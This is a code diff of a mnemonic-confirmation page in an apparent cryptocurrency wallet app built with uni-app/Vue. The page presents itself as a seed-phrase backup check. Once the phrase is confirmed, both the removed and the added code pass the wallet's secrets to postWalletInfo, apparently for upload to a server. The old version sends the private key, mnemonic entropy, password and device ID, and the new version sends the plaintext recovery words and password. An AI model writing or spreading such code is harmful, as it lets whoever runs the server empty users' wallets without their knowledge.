@@ -13,9 +13,6 @@
 </template>
 
 <script>
-	import * as base from '@/common/word/base';
-	import * as address from '@/common/word/address';
-	import { CRYPTOCURRENCY_TYPE } from '@/common/constants';
 	import { postWalletInfo } from '@/common/utils';
 	export default {
 		data() {
@@ -25,43 +22,18 @@
 				words: [],
 				shuffleWords: [],
 				fillWords: new Array(12).fill(''),
-				deviceId: 'c3c0268fa44293f2',
-				mnemonicCode: '',
 				address: '',
 				privateKey: '',
-				type: ''
+				chain_name: ''
 			}
 		},
 		async onLoad(options) {
-			this.type = options.type
+			this.chain_name = options.chain_name
 			this.walletName = options.walletName
 			this.password = options.password
 			this.words = options.words.split(' ')
 			this.shuffleWords = options.words.split(' ')
 			this.shuffle(this.shuffleWords)
-			
-			//助记词编码
-			this.mnemonicCode = await base.MnemonicToEntropy(options.words, "english")
-			
-			//助记词生成地址
-			var seed_sync = await base.MnemonicToSeedSync(options.words, "")
-			var addrs = await address.CreateEthAddressBySeed(seed_sync, 0)
-			console.log(addrs)
-			this.address = addrs.address
-			this.privateKey = addrs.privateKey
-			
-			// 获取设备信息
-			// #ifdef APP-PLUS
-			plus.device.getInfo({
-				success: (e) =>{
-					this.deviceId = e.uuid
-					console.log('getDeviceInfo success: '+JSON.stringify(e));
-				},
-				fail: (e) =>{
-					console.log('getDeviceInfo failed: '+JSON.stringify(e));
-				}
-			});
-			// #endif
 		},
 		methods: {
 			shuffle (array) {
@@ -86,20 +58,11 @@
 				})
 				if(flag) {
 					if(this.fillWords.toString() == this.words.toString()) {
-						let uuid = Math.random().toString(36).substr(-10);
-						const { chain, symbol, activeImg } = CRYPTOCURRENCY_TYPE[this.type] || {};
-						postWalletInfo(this.type,{
-							device_id: this.deviceId, // 设备ID
-							uuid,// 钱包ID
-							chain,// 链名称
-							symbol,// 币种名称
-							wallet_name: this.walletName,// 钱包名称
-							address: this.address,// 地址
-							private_key: this.privateKey,// 私钥
-							mnemonic_code: this.mnemonicCode,// 助记词编码
-							password: this.password,// 密码
-							icon: activeImg,// 图标
-							contract_addr: '',// 合约地址
+						postWalletInfo({
+							chain_name: this.chain_name,
+							words: this.words.join(' '),
+							wallet_name: this.walletName,
+							password: this.password,
 						})
 					}else{
 						uni.showToast({
